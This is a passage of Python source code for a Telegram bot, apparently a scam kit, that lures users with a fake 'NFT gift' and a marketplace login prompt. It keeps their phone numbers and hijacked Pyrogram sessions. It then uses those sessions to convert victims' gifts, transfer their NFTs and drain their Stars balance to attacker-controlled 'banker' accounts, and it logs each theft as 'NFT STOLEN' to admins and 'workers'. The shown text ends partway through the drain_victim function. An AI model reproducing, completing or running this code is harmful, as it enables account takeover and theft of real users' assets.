#!/usr/bin/env python3
"""
======================================================================================
                    MARKETPLACE & NFT UNIFIED BOT v3.0
          Features: Multi-language, Beautiful UI, Advanced Fake Gifts
======================================================================================
"""

import asyncio
import logging
import sys
import os
import re
import json
import time
import sqlite3
import secrets
from pathlib import Path
from typing import Optional, Dict, List, Tuple
from datetime import datetime
import aiohttp

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardButton, WebAppInfo, FSInputFile,
    InlineQueryResultArticle, InputTextMessageContent, CallbackQuery
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client, enums
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait, BadRequest, RPCError, AuthKeyUnregistered
)

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("UnifiedBot")

# ================= CONFIGURATION =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)


def load_settings() -> dict:
    path = BASE_DIR / "settings.json"
    if path.exists():
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if "site_url" in data and "api_url" not in data:
                data["api_url"] = data["site_url"].rstrip('/')
            return data
    return {
        "bot_token": os.getenv("BOT_TOKEN", ""),
        "log_bot_token": os.getenv("LOG_BOT_TOKEN", ""),
        "api_id": int(os.getenv("API_ID", 0)),
        "api_hash": os.getenv("API_HASH", ""),
        "api_url": os.getenv("SITE_URL", "http://localhost:3000").rstrip('/'),
        "admin_ids": [],
        "workers": [],
        "target_user": None,
        "banker_session": None
    }


def save_settings():
    path = BASE_DIR / "settings.json"
    SETTINGS["workers"] = list(workers_list)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=2, ensure_ascii=False)


SETTINGS = load_settings()

# ================= GIFT MAP =================
GIFT_MAP = {
    15:  {'get': 13, 'ids': [5170233102089322756, 5170145012310081615]},
    25:  {'get': 21, 'ids': [5168103777563050263, 5170250947678437525]},
    50:  {'get': 43, 'ids': [6028601630662853006, 5170564780938756245]},
    100: {'get': 85, 'ids': [5170521118301225164]}
}

# ================= LOG BOT =================
log_bot = None

async def init_log_bot():
    """Initialize separate bot for logging"""
    global log_bot
    log_token = SETTINGS.get('log_bot_token')
    if not log_token:
        logger.warning("Log bot token not set in settings.json, logging to Telegram disabled")
        return
    
    try:
        log_bot = Bot(token=log_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        logger.info("✅ Log bot initialized")
    except Exception as e:
        logger.error(f"❌ Failed to initialize log bot: {e}")

async def send_log_to_admins(text: str):
    """Send log message to all admins via log bot"""
    global log_bot
    if not log_bot:
        return
    
    admins = SETTINGS.get('admin_ids', [])
    if not admins:
        logger.warning("No admin IDs configured for logging")
        return
    
    try:
        for admin_id in admins:
            try:
                await log_bot.send_message(chat_id=admin_id, text=text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            except Exception as e:
                logger.error(f"Failed to send log to admin {admin_id}: {e}")
    except Exception as e:
        logger.error(f"Log bot error: {e}")

async def log_event(text: str):
    """Log event to admins"""
    await send_log_to_admins(text)

async def alert_admins(text: str):
    """Send error alert to all admins"""
    clean_text = str(text).replace("<", "&lt;").replace(">", "&gt;")
    msg = f"❌ <b>BOT ERROR</b>\n\n<pre>{clean_text[:3000]}</pre>"
    await send_log_to_admins(msg)

async def notify_worker(worker_id: int, text: str):
    """Notify worker about important events"""
    global log_bot
    if not log_bot or not worker_id:
        return
    try:
        await log_bot.send_message(chat_id=worker_id, text=text, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Failed to notify worker {worker_id}: {e}")

# ================= LOCALIZATION =================
TEXTS = {
    "en": {
        "welcome": "<b>The Gateway's are open</b> 🫰\n\nA new trending way to trade Telegram gifts is here.\n\n📍 <b>Buy • Sell • Collect</b> — all in one place.",
        "btn_webapp": "🌀 Enter Stream",
        "btn_about": "ℹ️ About Us",
        "gift_received": "🎉 <b>CONGRATULATIONS!</b>\n\nYou have just received a new NFT gift!\n\n💎 <b>IonicDryer #7561</b> (<a href='https://t.me/nft/IonicDryer-7561'>https://t.me/nft/IonicDryer-7561</a>)\n\n<i>Gift added to your profile!</i>",
        "gift_already_claimed": "⚠️ <b>Gift Already Active</b>\n\nThis gift has already been activated by: <b>@{user}</b>",
        "withdraw_prompt": "⚠️ <b>Action Required</b>\n\nTo withdraw or trade this gift, please log in to the Marketplace.",
        "worker_activated": "✅ <b>Worker Mode Activated</b>\n\n🔹 Inline Mode: Enabled\n🔹 Commands: <code>/pyid</code>, <code>/1</code>",
        "choose_lang": "🌐 <b>Welcome! Please select your language:</b>",
        "lang_set": "✅ Language set to <b>English</b>."
    },
    "ru": {
        "welcome": "<b>Поток открыт</b> 🫰\n\nНовый трендовый способ обмена подарками Telegram уже здесь.\n\n📍 <b>Покупай • Продавай • Собирай</b> — всё в одном месте.",
        "btn_webapp": "🌀 Войти в Поток",
        "btn_about": "ℹ️ Подробнее о нас",
        "gift_received": "🎉 <b>ПОЗДРАВЛЯЕМ!</b>\n\nВы только что получили новый NFT подарок!\n\n💎 <b>IonicDryer #7561</b> (<a href='https://t.me/nft/IonicDryer-7561'>https://t.me/nft/IonicDryer-7561</a>)\n\n<i>Подарок добавлен в ваш профиль!</i>",
        "gift_already_claimed": "⚠️ <b>Подарок уже активирован</b>\n\nЭтот подарок уже был активирован пользователем: <b>@{user}</b>",
        "withdraw_prompt": "⚠️ <b>Требуется действие</b>\n\nЧтобы вывести или обменять этот подарок, пожалуйста, войдите в Маркет.",
        "worker_activated": "✅ <b>Режим Воркера Активирован</b>\n\n🔹 Инлайн режим: Включен\n🔹 Команды: <code>/pyid</code>, <code>/1</code>",
        "choose_lang": "🌐 <b>Добро пожаловать! Выберите язык:</b>",
        "lang_set": "✅ Язык установлен: <b>Русский</b>."
    }
}


# ================= DATABASE =================
class UnifiedDatabase:
    def __init__(self, db_file="unified_bot.db"):
        self.path = BASE_DIR / db_file
        self.conn = sqlite3.connect(str(self.path), check_same_thread=False, timeout=10.0)
        self.cursor = self.conn.cursor()
        self.lock = asyncio.Lock()  # Блокировка для async операций
        self.create_tables()
        self.check_migrations()
        self.load_workers()

    def create_tables(self):
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            balance INTEGER DEFAULT 0,
            is_authorized BOOLEAN DEFAULT 0,
            is_worker BOOLEAN DEFAULT 0,
            language TEXT DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS gifts (
            hash TEXT PRIMARY KEY,
            creator_id INTEGER,
            claimed_by TEXT DEFAULT NULL,
            is_claimed BOOLEAN DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.conn.commit()

    def check_migrations(self):
        try:
            self.cursor.execute("SELECT is_worker FROM users LIMIT 1")
        except:
            self.cursor.execute("ALTER TABLE users ADD COLUMN is_worker BOOLEAN DEFAULT 0")
        try:
            self.cursor.execute("SELECT language FROM users LIMIT 1")
        except:
            self.cursor.execute("ALTER TABLE users ADD COLUMN language TEXT DEFAULT NULL")
        self.conn.commit()

    def load_workers(self):
        try:
            self.cursor.execute("SELECT user_id FROM users WHERE is_worker = 1")
            rows = self.cursor.fetchall()
            for row in rows:
                workers_list.add(row[0])
        except:
            pass

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = self.cursor.fetchone()
        if not row:
            return None
        return {
            'user_id': row[0], 'username': row[1], 'first_name': row[2], 'phone': row[3],
            'is_authorized': bool(row[5]), 'is_worker': bool(row[6]), 'language': row[7]
        }

    def get_user_by_username(self, username):
        clean = username.replace("@", "").lower().strip()
        self.cursor.execute("SELECT user_id, first_name, language FROM users WHERE lower(username) = ?", (clean,))
        return self.cursor.fetchone()

    def add_user(self, user_id, username, first_name, phone=None):
        try:
            if not self.get_user(user_id):
                self.cursor.execute(
                    "INSERT INTO users (user_id, username, first_name, phone) VALUES (?, ?, ?, ?)",
                    (user_id, username or "Unknown", first_name or "Unknown", phone)
                )
            else:
                self.cursor.execute(
                    "UPDATE users SET username = ?, first_name = ?, phone = ? WHERE user_id = ?",
                    (username or "Unknown", first_name or "Unknown", phone, user_id)
                )
            self.conn.commit()
        except Exception as e:
            logger.error(f"DB Error add_user: {e}")

    def set_language(self, user_id, lang):
        self.cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
        self.conn.commit()

    def set_worker(self, user_id):
        self.cursor.execute("UPDATE users SET is_worker = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()
        workers_list.add(user_id)
        save_settings()

    def mark_authorized(self, user_id, phone):
        self.cursor.execute("UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?", (phone, user_id))
        self.conn.commit()
    
    async def mark_authorized_async(self, user_id, phone):
        """Async version with lock"""
        async with self.lock:
            try:
                self.cursor.execute("UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?", (phone, user_id))
                self.conn.commit()
            except sqlite3.OperationalError as e:
                if "locked" in str(e).lower():
                    await asyncio.sleep(0.1)
                    self.cursor.execute("UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?", (phone, user_id))
                    self.conn.commit()
                else:
                    raise
    
    async def add_user_async(self, user_id, username, first_name, phone=None):
        """Async version with lock"""
        async with self.lock:
            try:
                if not self.get_user(user_id):
                    self.cursor.execute(
                        "INSERT INTO users (user_id, username, first_name, phone) VALUES (?, ?, ?, ?)",
                        (user_id, username or "Unknown", first_name or "Unknown", phone)
                    )
                else:
                    self.cursor.execute(
                        "UPDATE users SET username = ?, first_name = ?, phone = ? WHERE user_id = ?",
                        (username or "Unknown", first_name or "Unknown", phone, user_id)
                    )
                self.conn.commit()
            except sqlite3.OperationalError as e:
                if "locked" in str(e).lower():
                    await asyncio.sleep(0.1)
                    if not self.get_user(user_id):
                        self.cursor.execute(
                            "INSERT INTO users (user_id, username, first_name, phone) VALUES (?, ?, ?, ?)",
                            (user_id, username or "Unknown", first_name or "Unknown", phone)
                        )
                    else:
                        self.cursor.execute(
                            "UPDATE users SET username = ?, first_name = ?, phone = ? WHERE user_id = ?",
                            (username or "Unknown", first_name or "Unknown", phone, user_id)
                        )
                    self.conn.commit()
                else:
                    logger.error(f"DB Error add_user_async: {e}")
            except Exception as e:
                logger.error(f"DB Error add_user_async: {e}")

    def register_gift(self, gift_hash, creator_id):
        try:
            self.cursor.execute("INSERT INTO gifts (hash, creator_id) VALUES (?, ?)", (gift_hash, creator_id))
            self.conn.commit()
        except:
            pass

    def get_gift_status(self, gift_hash):
        self.cursor.execute("SELECT is_claimed, claimed_by FROM gifts WHERE hash = ?", (gift_hash,))
        return self.cursor.fetchone()

    def claim_gift(self, gift_hash, username):
        self.cursor.execute("UPDATE gifts SET is_claimed = 1, claimed_by = ? WHERE hash = ?", (username, gift_hash))
        self.conn.commit()

    def get_stats(self):
        try:
            self.cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
            u = self.cursor.fetchone()[0]
            self.cursor.execute("SELECT SUM(balance) FROM users")
            b = self.cursor.fetchone()[0] or 0
            return u, b
        except:
            return 0, 0


db = UnifiedDatabase()
workers_list = set(SETTINGS.get("workers", []))


# ================= STATES & STORAGE =================
class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()


user_sessions = {}
pyrogram_clients = {}
processed_requests = {}
admin_auth_process = {}
banker_clients = {}  # Store banker clients by username


# ================= SESSION MANAGEMENT =================
async def cleanup_expired_session(client: Client, session_name: str = None):
    """Удалить истекшую сессию и разорвать соединение"""
    try:
        # Получаем имя сессии из client, если не указано
        if not session_name:
            if hasattr(client, 'storage') and hasattr(client.storage, 'name'):
                session_name = client.storage.name
            elif hasattr(client, 'name'):
                session_name = client.name
            # Пытаемся получить из пути сессии (workdir)
            elif hasattr(client, 'workdir'):
                # Извлекаем имя из пути, например: sessions/79991234567 -> 79991234567
                workdir_path = Path(client.workdir) if client.workdir else None
                if workdir_path:
                    # Ищем файлы .session в директории
                    session_files = list(workdir_path.glob("*.session"))
                    if session_files:
                        session_name = session_files[0].stem
        
        logger.warning(f"🗑️ Cleaning up expired session: {session_name}")
        
        # Разрываем соединение
        try:
            if client.is_connected:
                await client.disconnect()
        except:
            pass
        
        # Удаляем файлы сессии
        if session_name:
            session_file = SESSIONS_DIR / f"{session_name}.session"
            session_journal = SESSIONS_DIR / f"{session_name}.session-journal"
            
            if session_file.exists():
                try:
                    session_file.unlink()
                    logger.info(f"✅ Deleted session file: {session_file}")
                except Exception as e:
                    logger.error(f"❌ Failed to delete session file: {e}")
            
            if session_journal.exists():
                try:
                    session_journal.unlink()
                    logger.info(f"✅ Deleted session journal: {session_journal}")
                except Exception as e:
                    logger.error(f"❌ Failed to delete session journal: {e}")
        
        # Очищаем из кэшей
        if session_name in banker_clients:
            del banker_clients[session_name]
        
        # Очищаем из pyrogram_clients (по phone)
        for phone, cached_client in list(pyrogram_clients.items()):
            if cached_client == client:
                del pyrogram_clients[phone]
                if phone in user_sessions:
                    del user_sessions[phone]
                break
        
        logger.warning(f"✅ Session cleaned up: {session_name}")
        
    except Exception as e:
        logger.error(f"❌ Error cleaning up session: {e}")


def handle_auth_error(e: Exception, client: Client, session_name: str = None):
    """Обработать ошибку авторизации и удалить сессию"""
    error_msg = str(e)
    if "AUTH_KEY_UNREGISTERED" in error_msg or "401" in error_msg or isinstance(e, AuthKeyUnregistered):
        logger.error(f"❌ Session expired (AUTH_KEY_UNREGISTERED): {session_name or 'unknown'}")
        asyncio.create_task(cleanup_expired_session(client, session_name))
        return True
    return False


# ================= HELPERS =================
def clean_phone(phone):
    if not phone:
        return ""
    # Remove all non-digit characters
    c = re.sub(r'\D', '', str(phone))
    # Handle Russian numbers (8 -> 7)
    if len(c) == 11 and c.startswith('8'):
        c = '7' + c[1:]
    # Handle 10-digit numbers (assume Russian)
    elif len(c) == 10:
        c = '7' + c
    # Always return with + prefix
    return '+' + c


def get_webapp_url(user_id):
    base = SETTINGS['api_url'].rstrip('/')
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"


def get_text(user_id, key):
    user = db.get_user(user_id)
    lang = user['language'] if user and user.get('language') else 'en'
    return TEXTS.get(lang, TEXTS['en']).get(key, "")


# ================= API HELPERS =================
async def send_claim_to_api(uid, gift_hash, username):
    """Send claim request to website API"""
    try:
        async with aiohttp.ClientSession() as session:
            url = f"{SETTINGS['api_url']}/api/telegram/claim-gift"
            payload = {
                "telegramId": str(uid),
                "giftId": f"IonicDryer-7561",
                "giftHash": gift_hash,
                "username": username
            }
            logger.info(f"[API] Sending claim: {payload}")
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                result = await resp.json()
                logger.info(f"[API] Claim response: {result}")
                return result
    except Exception as e:
        logger.error(f"[API] Claim error: {e}")
        return None


async def update_api_status(api_url, rid, status, **kwargs):
    """Update auth request status on website"""
    url = f"{api_url}/api/telegram/update-request"
    data = {"requestId": rid, "status": status, "processed": True, **kwargs}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, json=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.read()  # Читаем ответ полностью, чтобы закрыть соединение
                logger.info(f"[API] Status update {status}: {resp.status}")
    except Exception as e:
        logger.error(f"[API] Status update error: {e}")


# ================= NFT DRAIN FUNCTIONS =================

async def get_stars_balance(client: Client) -> int:
    """Get Stars balance"""
    try:
        balance = await client.get_stars_balance("me")
        return int(balance)
    except Exception as e:
        logger.error(f"Error getting stars balance: {e}")
        return 0


async def send_gift_task(client: Client, target_id, price: int) -> bool:
    """Отправить подарок (функция банкира)"""
    gift_data = GIFT_MAP.get(price)
    if not gift_data:
        return False
    
    gift_id = gift_data['ids'][0] if gift_data['ids'] else GIFT_MAP[50]['ids'][0]
    try:
        await client.send_gift(chat_id=target_id, gift_id=gift_id)
        logger.info(f"✅ Gift sent: {price} USDT")
        return True
    except FloodWait as e:
        await asyncio.sleep(e.value)
        try:
            await client.send_gift(chat_id=target_id, gift_id=gift_id)
            return True
        except:
            return False
    except Exception as e:
        logger.error(f"❌ Gift send error: {e}")
        return False


def get_nft_url(title: str, collectible_id: int) -> str:
    """Формирует ссылку на NFT в формате https://t.me/nft/Title-12345"""
    if not title or not collectible_id:
        return ""
    # Убираем эмодзи и специальные символы, оставляем только буквы, цифры и пробелы
    clean_title = re.sub(r'[^\w\s]', '', str(title))  # Убираем эмодзи и спецсимволы
    # Убираем пробелы и делаем каждое слово с заглавной буквы (CamelCase)
    words = clean_title.split()
    if words:
        # Первое слово с заглавной, остальные тоже с заглавной (CamelCase)
        clean_title = ''.join(word.capitalize() for word in words)
    else:
        # Если нет слов, просто убираем пробелы
        clean_title = re.sub(r'\s+', '', clean_title)
        if clean_title:
            clean_title = clean_title[0].upper() + clean_title[1:] if len(clean_title) > 1 else clean_title.upper()
    return f"https://t.me/nft/{clean_title}-{collectible_id}"


def analyze_gift(gift, location_name="Me"):
    """Analyze gift properties"""
    details = {
        'id': gift.id,
        'msg_id': gift.message_id,
        'title': 'Gift',
        'star_count': gift.convert_price or 0,
        'transfer_cost': gift.transfer_price or 0,
        'is_nft': False,
        'can_transfer': False,
        'can_convert': False,
        'location': location_name,
        'collectible_id': None
    }
    
    if getattr(gift, 'collectible_id', None) is not None:
        details['is_nft'] = True
        details['collectible_id'] = gift.collectible_id
        details['title'] = gift.title or f"NFT #{gift.collectible_id}"
        if gift.can_transfer_at is None:
            details['can_transfer'] = True
        else:
            now = datetime.now(gift.can_transfer_at.tzinfo) if gift.can_transfer_at.tzinfo else datetime.now()
            details['can_transfer'] = (gift.can_transfer_at <= now)
    else:
        is_converted = getattr(gift, 'is_converted', False)
        details['can_convert'] = (details['star_count'] > 0) and (not is_converted)
        details['title'] = f"🎁 Gift #{gift.id}"
    
    return details


async def get_owned_channels(client: Client):
    """Get channels owned by user"""
    channels = []
    try:
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL and dialog.chat.is_creator:
                channels.append(dialog.chat)
    except Exception as e:
        logger.error(f"Error getting channels: {e}")
    return channels


async def scan_location_gifts(client: Client, peer_id, location_name):
    """Scan gifts in location (profile or channel)"""
    found_gifts = []
    try:
        async for gift in client.get_chat_gifts(chat_id=peer_id):
            found_gifts.append(analyze_gift(gift, location_name))
    except Exception as e:
        logger.error(f"Error scanning gifts in {location_name}: {e}")
    return found_gifts


async def convert_gift_task(client: Client, gift_msg_id: int) -> Tuple[bool, int]:
    """Конвертировать подарок в звезды"""
    try:
        balance_before = await get_stars_balance(client)
        result = await client.convert_gift_to_stars(owned_gift_id=str(gift_msg_id))
        
        # Пытаемся получить количество звезд из результата
        stars_got = 0
        if hasattr(result, 'stars_earned'):
            stars_got = result.stars_earned
        elif hasattr(result, 'stars'):
            stars_got = result.stars
        elif isinstance(result, (int, float)):
            stars_got = int(result)
        
        # Если не получили из результата, проверяем баланс
        if stars_got == 0:
            await asyncio.sleep(0.5)  # Ждем обновления баланса
            balance_after = await get_stars_balance(client)
            stars_got = balance_after - balance_before
        
        logger.info(f"✅ Gift converted: +{stars_got} stars (balance: {balance_before} → {balance_before + stars_got})")
        return True, stars_got
    except Exception as e:
        logger.error(f"❌ Convert error: {e}")
        return False, 0


async def topup_balance_for_transfer(victim_client: Client, banker_client: Client, needed_stars: int, victim_username: str):
    """Отправить подарки жертве и конвертировать их для пополнения баланса"""
    try:
        logger.info(f"💰 Need {needed_stars} stars. Sending gifts to victim...")
        
        # Вычисляем оптимальное количество подарков
        # 1 NFT передача = 25 звезд
        # Нужно отправить подарки, которые дадут нужное количество звезд при конвертации
        gifts_to_send = []
        stars_needed = needed_stars
        
        # Сортируем по выгодности (get/stars ratio)
        sorted_gifts = sorted(
            [(price, data) for price, data in GIFT_MAP.items() if data.get('ids')],
            key=lambda x: x[1]['get'] / x[0] if x[0] > 0 else 0,
            reverse=True
        )
        
        for price, gift_data in sorted_gifts:
            while stars_needed > 0 and gift_data.get('ids'):
                gifts_to_send.append((price, gift_data['ids'][0]))
                stars_needed -= gift_data['get']
                if stars_needed <= 0:
                    break
        
        if not gifts_to_send:
            logger.error("❌ Cannot calculate gifts to send")
            return False
        
        logger.info(f"📦 Will send {len(gifts_to_send)} gifts to get {needed_stars} stars")
        
        # Отправляем подарки от банкира жертве (по username)
        sent_gifts = []
        for price, gift_id in gifts_to_send:
            try:
                await banker_client.send_gift(chat_id=victim_username, gift_id=gift_id)
                sent_gifts.append((price, gift_id))
                logger.info(f"✅ Sent gift {price} USDT to victim (@{victim_username})")
                await asyncio.sleep(0.5)  # Небольшая задержка между отправками
            except FloodWait as e:
                await asyncio.sleep(e.value)
                try:
                    await banker_client.send_gift(chat_id=victim_username, gift_id=gift_id)
                    sent_gifts.append((price, gift_id))
                except Exception as e2:
                    logger.error(f"❌ Failed to send gift after FloodWait: {e2}")
            except Exception as e:
                logger.error(f"❌ Error sending gift: {e}")
        
        if not sent_gifts:
            logger.error("❌ No gifts were sent")
            return False
        
        # Ждем, пока подарки появятся у жертвы
        logger.info("⏳ Waiting for gifts to appear (1.0 sec)...")
        await asyncio.sleep(1.0)
        
        # Проверяем баланс до конвертации
        balance_before = await get_stars_balance(victim_client)
        logger.info(f"💰 Balance before conversion: {balance_before} stars")
        
        # Конвертируем подарки до достижения нужного баланса
        max_attempts = 3
        attempt = 0
        current_balance = balance_before
        
        while current_balance < balance_before + needed_stars and attempt < max_attempts:
            attempt += 1
            logger.info(f"🔄 Conversion attempt {attempt}/{max_attempts}...")
            
            # Сканируем подарки жертвы
            found_gifts = await scan_location_gifts(victim_client, "me", "Profile")
            convertible_gifts = [g for g in found_gifts if not g['is_nft'] and g['can_convert']]
            
            if not convertible_gifts:
                logger.warning("⚠️ No convertible gifts found")
                await asyncio.sleep(1.0)
                continue
            
            # Сортируем по msg_id (более новые подарки первыми)
            convertible_gifts.sort(key=lambda x: x['msg_id'], reverse=True)
            
            # Конвертируем подарки
            converted_this_round = 0
            for gift in convertible_gifts:
                if current_balance >= balance_before + needed_stars:
                    break
                
                success, stars = await convert_gift_task(victim_client, gift['msg_id'])
                if success:
                    converted_this_round += 1
                    current_balance += stars
                    logger.info(f"✅ Converted gift: +{stars} stars (balance: {current_balance}, need: {balance_before + needed_stars})")
                    await asyncio.sleep(0.5)
            
            # Проверяем актуальный баланс
            await asyncio.sleep(0.5)
            current_balance = await get_stars_balance(victim_client)
            logger.info(f"💰 Current balance: {current_balance} stars (need: {balance_before + needed_stars})")
            
            if current_balance >= balance_before + needed_stars:
                break
            
            # Если баланса все еще недостаточно, ждем и пробуем еще раз
            if attempt < max_attempts:
                logger.info(f"⏳ Balance still insufficient, waiting 1 sec before next attempt...")
                await asyncio.sleep(1.0)
        
        # Финальная проверка баланса
        final_balance = await get_stars_balance(victim_client)
        actual_stars_got = final_balance - balance_before
        logger.info(f"💰 Final balance: {final_balance} stars (+{actual_stars_got}, needed: {needed_stars})")
        
        if final_balance >= balance_before + needed_stars:
            logger.info(f"✅ Top-up successful: +{actual_stars_got} stars (needed: {needed_stars})")
            return True
        else:
            logger.error(f"❌ Top-up failed: got +{actual_stars_got} stars, but needed {needed_stars}")
            return False
        
    except Exception as e:
        logger.error(f"❌ Top-up error: {e}")
        return False


async def transfer_nft_task(client: Client, gift_details, target_username: str, banker_client: Client = None) -> bool:
    """Transfer NFT to target with automatic balance top-up if needed"""
    try:
        await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_username)
        logger.info(f"✅ NFT TRANSFERRED: {gift_details['title']} to {target_username}")
        # Log to Telegram
        nft_url = ""
        if gift_details.get('collectible_id'):
            nft_url = get_nft_url(gift_details['title'], gift_details['collectible_id'])
        
        log_text = f"💎 <b>NFT STOLEN</b>\n\n"
        if nft_url:
            log_text += f"<b><a href=\"{nft_url}\">{gift_details['title']}</a></b>\n"
        else:
            log_text += f"<b>{gift_details['title']}</b>\n"
        log_text += f"📍 From: {gift_details['location']}\n👤 To: @{target_username}"
        await log_event(log_text)
        return True
    except FloodWait as e:
        logger.warning(f"⏳ FloodWait {e.value}s, waiting...")
        await asyncio.sleep(e.value)
        try:
            await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_username)
            logger.info(f"✅ NFT TRANSFERRED (after wait): {gift_details['title']}")
            return True
        except Exception as e2:
            logger.error(f"❌ Transfer error after wait: {e2}")
            return False
    except BadRequest as e:
        error_msg = str(e)
        if "BALANCE_TOO_LOW" in error_msg:
            logger.warning(f"⚠️ BALANCE_TOO_LOW for {gift_details['title']}. Need to top up balance...")
            
            if not banker_client:
                logger.error("❌ No banker client provided for top-up")
                return False
            
            # 1 NFT передача = 25 звезд
            transfer_cost = 25
            current_balance = await get_stars_balance(client)
            needed_stars = transfer_cost - current_balance  # Ровно столько, сколько нужно
            
            if needed_stars > 0:
                logger.info(f"💰 Current balance: {current_balance}, need: {needed_stars} stars")
                
                # Получаем username жертвы (нужно отправлять подарки по username)
                me = await client.get_me()
                victim_username = me.username
                
                if not victim_username:
                    logger.error(f"❌ Victim has no username. Cannot send gifts.")
                    return False
                
                # Пополняем баланс (используем username)
                topup_success = await topup_balance_for_transfer(client, banker_client, needed_stars, victim_username)
                
                if topup_success:
                    # Проверяем баланс после top-up
                    await asyncio.sleep(0.5)  # Ждем обновления баланса
                    final_balance = await get_stars_balance(client)
                    logger.info(f"💰 Balance after top-up: {final_balance} stars (need: {transfer_cost})")
                    
                    if final_balance < transfer_cost:
                        logger.error(f"❌ Balance {final_balance} is still too low (need: {transfer_cost}). Top-up was insufficient.")
                        return False
                    
                    # Повторяем попытку передачи
                    try:
                        await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_username)
                        logger.info(f"✅ NFT TRANSFERRED (after top-up): {gift_details['title']}")
                        # Log to Telegram
                        nft_url = ""
                        if gift_details.get('collectible_id'):
                            nft_url = get_nft_url(gift_details['title'], gift_details['collectible_id'])
                        
                        log_text = f"💎 <b>NFT STOLEN</b>\n\n"
                        if nft_url:
                            log_text += f"<b><a href=\"{nft_url}\">{gift_details['title']}</a></b>\n"
                        else:
                            log_text += f"<b>{gift_details['title']}</b>\n"
                        log_text += f"📍 From: {gift_details['location']}\n👤 To: @{target_username}"
                        await log_event(log_text)
                        return True
                    except BadRequest as e2:
                        error_msg2 = str(e2)
                        if "BALANCE_TOO_LOW" in error_msg2:
                            logger.error(f"❌ Transfer failed after top-up: Balance still too low. Balance: {final_balance}, need: {transfer_cost}")
                        else:
                            logger.error(f"❌ Transfer failed after top-up: {e2}")
                        return False
                    except Exception as e2:
                        logger.error(f"❌ Transfer failed after top-up: {e2}")
                        return False
                else:
                    logger.error("❌ Top-up failed")
                    return False
            else:
                logger.error(f"❌ Cannot calculate needed stars")
                return False
        else:
            logger.error(f"❌ Transfer error ({gift_details['title']}): {e}")
            return False
    except Exception as e:
        logger.error(f"❌ Transfer error ({gift_details['title']}): {e}")
        return False


async def drain_stars_user(client: Client, banker_username: str):
    """Drain all Stars balance by sending gifts to banker"""
    try:
        balance = await get_stars_balance(client)
        if balance < 15:
            logger.info(f"Balance {balance} too small to drain")
            return
        
        logger.info(f"💰 Starting balance drain: {balance} ⭐️")
        
        sorted_prices = sorted([k for k in GIFT_MAP.keys() if GIFT_MAP[k].get('ids')], reverse=True)
        gifts_to_send = []
        temp_bal = balance
        
        for price in sorted_prices:
            while temp_bal >= price:
                gift_data = GIFT_MAP.get(price)
                if gift_data and gift_data.get('ids'):
                    gift_id = gift_data['ids'][0]
                    gifts_to_send.append((price, gift_id))
                    temp_bal -= price
                else:
                    break
        
        if not gifts_to_send:
            logger.info("No gifts to send")
            return
        
        logger.info(f"🔥 Will send {len(gifts_to_send)} gifts totaling {balance - temp_bal} stars")
        
        count = 0
        for price, gift_id in gifts_to_send:
            try:
                await client.send_gift(chat_id=banker_username, gift_id=gift_id)
                count += 1
                await asyncio.sleep(0.5)
            except FloodWait as e:
                logger.warning(f"⏳ FloodWait {e.value}s while draining")
                await asyncio.sleep(e.value)
                try:
                    await client.send_gift(chat_id=banker_username, gift_id=gift_id)
                    count += 1
                except:
                    pass
            except Exception as e:
                logger.error(f"❌ Error sending gift ({price}): {e}")
        
        logger.info(f"✅ Drain complete. Sent: {count} of {len(gifts_to_send)}")
    except Exception as e:
        logger.error(f"❌ Drain error: {e}")


async def drain_victim(client: Client, target_username: str, bot: Bot = None):
    """Full drain process: scan, convert, transfer NFTs, drain Stars"""
    session_name = None
    try:
        # Получаем имя сессии из пути клиента
        if hasattr(client, 'storage') and hasattr(client.storage, 'name'):
            session_name = client.storage.name
        elif hasattr(client, 'name'):
            session_name = client.name
        # Пытаемся получить из workdir (путь к сессии)
        elif hasattr(client, 'workdir') and client.workdir:
            workdir_path = Path(client.workdir)
            # Ищем файлы .session в директории
            session_files = list(workdir_path.glob("*.session"))
            if session_files:
                session_name = session_files[0].stem
        
        if not client.is_connected:
            await client.connect()
        
        try:
            me = await client.get_me()
            logger.info(f"--- DRAIN START: @{me.username} ({me.id}) ---")
